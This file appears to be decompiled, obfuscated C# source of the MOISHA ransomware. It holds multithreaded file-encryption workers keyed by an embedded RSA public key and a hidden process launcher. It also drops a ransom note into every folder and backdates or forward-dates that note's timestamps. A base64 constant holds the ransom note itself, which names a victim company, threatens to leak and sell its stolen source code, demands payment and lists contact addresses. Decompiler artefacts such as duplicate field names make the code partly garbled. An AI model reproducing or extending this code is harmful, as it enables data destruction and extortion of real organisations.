using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using _003CPrivateImplementationDetails_003E_007B18A11B1C_002D3AA7_002D4357_002DAAD9_002DCC83BB5216E3_007D;
using MOISHE.Core;

namespace A;

internal static class A
{
	[STAThread]
	private static void A()
	{
		Process process = new Process();
		process.StartInfo.FileName = Class0.C();
		process.StartInfo.Arguments = Class0.c();
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.Start();
	}
}
internal class a
{
	private BlockingCollection<string> m_A;

	private List<EncryptionConsumer> m_A;

	private KeyGenerator m_A;

	private List<string> m_A;

	private int m_A;

	private List<string> m_a;

	private const string m_A = "MIICCgKCAgEAymA9dRumxsjTrSowf1gLVxMPDLXE2XzQUZTQgCdTfZzL33jA0iS4gosxIPk57tCk\r\nur8Kt/lh9Ac6Wq7snMptzFBNte5QLktwl07vPnwqynsqwv3uWVe9aQXJgQ/lzbs/fSlwcshFNzJV\r\npqOpqYWRK0YXp3z4IC+FpzK6A1SMEgo/Iru+EArcEtE9zjCH3N1BBJes2O8y1MqirKfZDM4SifQD\r\nZ8GThBaHtWvP0DkKn3rkHEY0hLof5eCei8+7JEEvVrFAfKg6fjelzyc/9bAOd1K/xBDVr4KO9i0h\r\nXyJIWokMMoZBbbQqTH4sxzPV9G1Hx5smYu/tfy8/QHIBL9BVzTO3IvNsCiGWyd0fKOLX/IclqtYH\r\nzm5Sm1DnMXsPcM1TEahu0dCXGt6mEUkmkpsV0dcP5VVZE4lb2ObPSco0l9xgzQUbTHh4OOHYBLo7\r\nizT+uLsuVRHYqteFFkO094zbx0ILknyeEfm/vO+XP2DA3uqBd+lDR/QyLzIizhv7qASQVy1sLIYV\r\nDFy2AvFVIkQBiQ+ywekhfNveNrHRp7oZ+AYxADhITmsjt5E1GycHNR+xv6ABW2V2uuhVbF+E4XNv\r\nMzrZng8hWXvvKN0iAT//fTDw4UXJl9lShKstja9OUvjBb7ht/O5JBFUVt+39VWyfHk7ivxtLakmf\r\nChOjI+O4hP0CAwEAAQ==";

	private const string m_a = "DQoNCiAgICAgICAgICAgICAgIyN+fn4jfn5+fn4jIyMjfn5+fn4jIyMjIyN+fn5+fiMjIyN+fn5+fiMjfn4jI35+fn5+IyMjI34NCiAgICAgICAgICAgICAgIyMjfiMjfn5+fiMjfn4jI35+fn5+fiMjfn5+fn5+IyN+fn5+fn5+fiMjfn4jI35+fn4jI35+IyMNCiAgICAgICAgICAgICAgIyN+I34jfn5+fiMjfn4jI35+fn5+fiMjfn5+fn5+fiMjIyN+fn5+fiMjIyMjI35+fn4jIyMjIyMNCiAgICAgICAgICAgICAgIyN+fn4jfn5+fiMjfn4jI35+fn5+fiMjfn5+fn5+fn5+fiMjfn5+fiMjfn4jI35+fn4jI35+IyMNCiAgICAgICAgICAgICAgIyN+fn4jfn5+fn4jIyMjfn5+fn4jIyMjIyN+fn5+fiMjIyN+fn5+fiMjfn4jI35+fn4jI35+IyMNCg0KSGkgSmV3ZWxzIEluZm9zeXN0ZW1zLCB0aGlzIGlzIE1vaXNoYSENCg0KV2hhdCBoYXBwZW5lZD8NCg0KQWxsIGp1c3Qgb3VyIFBvbGVzIFRlc3RlcnMgdGVhbSBwZW5ldHJhdGVkIHlvdXIgbmV0d29yayENCldoYXQgZG8gd2Ugd2FudD8gV2Ugd2FudCBtb25leSBmb3Igb3VyIHNpbGVuY2UgYW5kIGRlY3J5cHRpbmcgeW91ciBmaWxlcyENCg0KV2hhdCBkaWQgd2UgZG8/LCBXZSBlbnRlcmVkIHlvdXIgY29ycG9yYXRlIG5ldHdvcmssIHN0b2xlIHlvdXIgd29yayBmaWxlcyBhbW9uZyB0aGVtIHRoZSBzb3VyY2UgY29kZXMgDQpvZiB5b3VyIHByb2plY3RzISBMZWF2aW5nLCB3ZSBlbmNyeXB0ZWQgdGhlbSwgbW9yZSB0aGFuIHlvdSBhcmUgc3VyZSBvZiB5b3UgaGF2ZSB0aGVpciBjb3B5IQ0KDQpXaGF0IGRvIHdlIGRvPyBXZSB3aWxsIGNvbnRhY3QgeW91ciBldmVyeSBjbGllbnQsIGFuZCBsZXQgdXMgaW5mb3JtIHlvdSB0aGF0IHlvdSB3ZXJlIGhhY2tlZCBhbmQgYWxsIA0KeW91ciBjdXN0b21lcnMgYXJlIG5vdyBhdCByaXNrIHdvcmtpbmcgd2l0aCB0aGUgcHJvZ3JhbXMgb2Ygd2hvc2Ugc291cmNlIGNvZGUgd2UgaGF2ZSENCg0KV2hhdCB0byBkbyB0aGF0IGFsbCB0aGlzIHdvdWxkIG5vdCBiZSBhbmQgcmV0dXJuIGFsbCB0byBwbGFjZXM/DQoNCkFsbCB3ZSBqdXN0IHdhbnQgbW9uZXksIG5hbWVseSA1NS41NTU1IGRvbGxhcnMsIGZvciBvdXIgc2lsZW5jZSBhbmQgZGVjcnlwdGlvbiBvZiB5b3VyIG5ldHdvcmsuDQoNCldoYXQgd2lsbCBoYXBwZW4gaWYgeW91IGRvIG5vdCBnZXQgaW4gdG91Y2g/IDoNCg0KMS4gV2Ugd2lsbCBwdWJsaXNoIHBhcnQgb2YgdGhlIHNvdXJjZSBvZiB5b3VyIHByb2plY3RzICh0aGlzIHdpbGwgY2F1c2UgcmVwdXRhdGlvbmFsIGhhcm0gdG8geW91ciBjb21wYW55KQ0KMi4gV2Ugd2lsbCBzZWxsIHBhcnQgb2YgdGhlIHNvdXJjZXMgdG8geW91ciBjb21wZXRpdG9ycyBvciBhbnlvbmUgd2hvIHdhbnRzIHRvIGJ1eSB0aGVtIQ0KMy4gV2UgYXJlIGtuaXR0ZWQgd2l0aCBldmVyeW9uZSB3aG8gd29ya3Mgd2l0aCB5b3Ugb3IgaGFzIGFueSBjb25uZWN0aW9uIHdpdGggeW91ciBjb21wYW55LCBiZSB5b3VyIA0KcGFydG5lcnMgb3IgY2xpZW50cyBvZiB5b3VyIGNvbXBhbnkuDQo0LiBXZSB3aWxsIHJlcG9ydCB0byByZWdpb25hbCBuZXdzIHRoYXQgeW91IHdlcmUgaGFja2VkIQ0KDQpBbGwgdGhpcyBjYW4gYmUgYXZvaWRlZCwgaG93Pw0KDQoxLiBZb3UgZ2V0IGluIHRvdWNoIHdpdGggdXMuDQoyLiBXZSBhZ3JlZSBpbiB0aGUgZmlyc3QgNDggaG91cnMgaXQgd2lsbCBiZSBmYXN0IQ0KMy4gWW91IHBheSB0aGUgYWdyZWVkIGFtb3VudC4NCjQuIFdlIHJlc3RvcmUgZXZlcnl0aGluZyB0aGF0IHdlIGVuY3J5cHRlZC4NCjUuIFdlIHdpbGwgcmV0dXJuIHlvdXIgc291cmNlIGNvZGVzIHRvIHlvdSBhbmQgd2lsbCBub3QgcHVibGlzaCB0aGVtIG9uIGZvcnVtcyBhbmQgc2VsbCB0aGVtIHRvIHNlY29uZCANCmFuZCB0aGlyZCBwYXJ0aWVzLg0KDQpNYWtlIHN1cmUgdGhhdCB3ZSBhcmUgbm90IHRoZSB0aW1lIHlvdSB3YXNoLCBsb29raW5nIGF0IHRoZSBwcm92aWRlcuKAmXMgcmVwb3J0IGFuZCB1bmRlcnN0YW5kIHRoYXQgYWxsIA0KeW91ciBzb3VyY2VzIGFuZCBwcm9qZWN0cyBtZXJnZWQgZnJvbSB5b3UgISENCg0KV2UgaGF2ZSBkb3dubG9hZGVkIGFsbCB5b3VyIHByb2dyYW0gc291cmNlcyEgb3ZlciAyMDAgZ2lnYWJ5dGVzISBEb24ndCBkZWxheSEgd2UgYXJlIHdhaXRpbmcgZm9yIHlvdSBhdCANCnRoZSBuZWdvdGlhdGlvbnMsIHdlIHdpbGwgYmUgYWJsZSB0byBjb25maXJtIHRoZSBhdmFpbGFiaWxpdHkgb2YgeW91ciBmaWxlcyENCg0KWW91IGNhbiBjb250YWN0IHVzOg0KVG8gcXVpY2tseSBjb21tdW5pY2F0ZSwgdXNlIG1haWwgKFJvYmVydG11bGRlcl8xOTY5QFByb3Rvbi5tZSBIZWZteXJhLTE5NjNAUHJvdG9uLm1lKQ0KDQoNCi0gVXNlIHRoZSBUb3ggTWVzc2VuZ2VyLCBZb3UgQ2FuIGRvd25sb2FkIGhlZXJlIGh0dHBzOi8vdG94LmNoYXQvDQoNCnRvIGNvbXVuaWNhdGUgd2l0aCB0aGUgT3BlcmF0b3IgVmlhIFRveCBNZXNzZW5nZXI6DQoNCk1vaXNoYSBJZCBPcGVyYXRvciBpbiBUb3ggTWVzc2VuZ2VyDQoNCjY5M0U5QjM2NDgwNjc4QzA1NTU1NUExMzUzMzdBNzI5MTNGQTE2RkE3MDQ5MTkxOTE5MTlCQ0VCREZDNjQ3QUNCMEJDQUNGMTYwQUE0MDgzMDQ2NDJCDQoNCg0KDQpTaW5jZXJlbHkgTU9JU0hBICEhDQoNCg0KDQojI35+fiN+fn5+fiMjIyN+fn5+fiMjIyMjI35+fn5+IyMjI35+fn5+IyN+fiMjfn5+fn4jIyMjfn5+fn4jI35+fn5+fiMjIyN+fn4jIyMjfn4jI35+IyMNCiMjI34jI35+fn4jI35+IyN+fn5+fn4jI35+fn5+fiMjfn5+fn5+fn4jI35+IyN+fn5+IyN+fiMjfn5+fiMjfn5+fn4jI35+IyN+IyN+fiMjfiMjfiMjfg0KIyN+I34jfn5+fiMjfn4jI35+fn5+fiMjfn5+fn5+fiMjIyN+fn5+fiMjIyMjI35+fn4jIyMjIyN+fn5+IyN+fn5+fiMjfn4jI34jI35+fn5+IyMjI35+DQojI35+fiN+fn5+IyN+fiMjfn5+fn5+IyN+fn5+fn5+fn5+IyN+fn5+IyN+fiMjfn5+fiMjfn4jI35+fn4jI35+fn5+IyN+fiMjfiMjfn4jI34jI34jI34NCiMjfn5+I35+fn5+IyMjI35+fn5+IyMjIyMjfn5+fn4jIyMjfn5+fn4jI35+IyN+fn5+IyN+fiMjfn5+fiMjIyMjI35+IyMjI35+fiMjIyN+fiMjfn4jIw==";

	public a(List<string> list_0)
	{
		this.m_A = 0;
		this.m_A = list_0;
		this.m_A = AbstractWorker.NewBlockingQueue<string>(50000);
		this.m_A = new List<EncryptionConsumer>();
		this.m_a = new List<string>();
		B();
		this.m_A = new KeyGenerator();
		this.m_A.ImportPublicKeyPEM(Class0.D());
		int num = Environment.ProcessorCount * 20;
		for (int i = 0; i < num; i++)
		{
			EncryptionConsumer encryptionConsumer = new EncryptionConsumer(this.m_A, this.m_A.NewSession(), this.m_a);
			encryptionConsumer.OnItem = (RecursorItemSubmittedHandler)Delegate.Combine(encryptionConsumer.OnItem, (RecursorItemSubmittedHandler)delegate(string string_0)
			{
				Interlocked.Decrement(ref this.m_A);
				try
				{
					FileInfo fileInfo = new FileInfo(string_0);
					DirectoryInfo directory = fileInfo.Directory;
					FileInfo fileInfo2 = new FileInfo(Path.Combine(directory.FullName, Class0.d()));
					A(fileInfo2.FullName);
				}
				catch
				{
				}
			});
			this.m_A.Add(encryptionConsumer);
		}
	}

	public void A()
	{
		foreach (EncryptionConsumer item in this.m_A)
		{
			item.Start();
		}
		foreach (string item2 in this.m_A)
		{
			if (item2 != null && item2.Trim().Length != 0)
			{
				FileSystem.RecursePath(item2, this.m_a, this.m_A, delegate
				{
					Interlocked.Increment(ref this.m_A);
				});
			}
		}
		while (this.m_A > 0)
		{
			Thread.Sleep(50);
		}
		foreach (string item3 in this.m_A)
		{
			string string_ = Path.Combine(item3, Class0.d());
			A(string_);
		}
		foreach (EncryptionConsumer item4 in this.m_A)
		{
			item4.Cancel();
		}
	}

	private static DateTime a()
	{
		Random random = new Random();
		int num = random.Next(180, 730);
		return DateTime.Now.AddDays(num);
	}

	private static void A(string string_0)
	{
		try
		{
			File.WriteAllBytes(string_0, Convert.FromBase64String(Class0.E().Replace(Class0.e(), Class0.F()).Replace(Class0.f(), Class0.F())
				.Replace(Class0.G(), Class0.F())
				.Replace(Class0.g(), Class0.F())
				.Trim()));
			DateTime dateTime = a();
			FileInfo fileInfo = new FileInfo(string_0);
			fileInfo.CreationTime = dateTime;
			fileInfo.LastAccessTime = dateTime;
			fileInfo.LastWriteTime = dateTime;
		}
		catch
		{
		}
	}

	private void B()
	{
		this.m_a.Add(Class0.H());
		this.m_a.Add(Class0.h());
		this.m_a.Add(Class0.I());
		this.m_a.Add(Class0.i());
		this.m_a.Add(Class0.J());
		this.m_a.Add(Class0.j());
		this.m_a.Add(Class0.K());
		this.m_a.Add(Class0.k());
		this.m_a.Add(Class0.L());
		this.m_a.Add(Class0.l());
		this.m_a.Add(Class0.M());
		this.m_a.Add(Class0.m());
		this.m_a.Add(Class0.N());
		this.m_a.Add(Class0.n());
		this.m_a.Add(Class0.O());
		this.m_a.Add(Class0.o());
		this.m_a.Add(Class0.P());
		this.m_a.Add(Class0.p());
		this.m_a.Add(Class0.Q());
		this.m_a.Add(Class0.q());
		this.m_a.Add(Class0.R());
		this.m_a.Add(Class0.r());
		this.m_a.Add(Class0.S());
		this.m_a.Add(Class0.s());
		this.m_a.Add(Class0.T());
		this.m_a.Add(Class0.t());
		this.m_a.Add(Class0.U());
		this.m_a.Add(Class0.u());
		this.m_a.Add(Class0.V());
		this.m_a.Add(Class0.v());
		this.m_a.Add(Class0.W());
		this.m_a.Add(Class0.w());
		this.m_a.Add(Class0.X());
		this.m_a.Add(Class0.x());
		this.m_a.Add(Class0.Y());
		this.m_a.Add(Class0.O());
		this.m_a.Add(Class0.d());
		this.m_a.Add(Class0.y());
		this.m_a.Add(Class0.Z());
		this.m_a.Add(Class0.z());
		this.m_a.Add(Class0.aA());
		this.m_a.Add(Class0.aa());
		this.m_a.Add(Class0.aB());
		this.m_a.Add(Class0.ab());
		this.m_a.Add(Class0.aC());
		this.m_a.Add(Class0.ac());
		this.m_a.Add(Class0.aD());
		this.m_a.Add(Class0.ad());
		this.m_a.Add(Class0.aE());
		this.m_a.Add(Class0.ae());
		this.m_a.Add(Class0.aF());
		this.m_a.Add(Class0.af());
		this.m_a.Add(Class0.aG());
		this.m_a.Add(Class0.ag());
		this.m_a.Add(Class0.aH());
		this.m_a.Add(Class0.ah());
	}

	[CompilerGenerated]
	private void a(string string_0)
	{
		Interlocked.Decrement(ref this.m_A);
		try
		{
			FileInfo fileInfo = new FileInfo(string_0);
			DirectoryInfo directory = fileInfo.Directory;
			FileInfo fileInfo2 = new FileInfo(Path.Combine(directory.FullName, Class0.d()));
			A(fileInfo2.FullName);
		}
		catch
		{
		}
	}

	[CompilerGenerated]
	private void B(string string_0)
	{
		Interlocked.Increment(ref this.m_A);
	}
}
